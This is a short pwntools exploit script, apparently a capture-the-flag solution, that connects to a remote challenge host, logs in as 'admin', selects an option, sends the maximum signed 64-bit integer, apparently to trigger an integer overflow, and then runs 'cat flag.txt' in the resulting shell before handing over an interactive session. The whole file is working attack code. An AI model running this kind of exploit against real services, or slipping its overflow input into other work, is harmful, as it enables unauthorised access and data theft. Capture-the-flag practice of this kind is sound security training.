from pwn import *

p = remote("pwn.dctf.si", 13374)
p.sendline(b"admin")
p.sendline(b"1")
p.sendline(b"9223372036854775807")
p.sendline(b"cat flag.txt")

p.interactive()
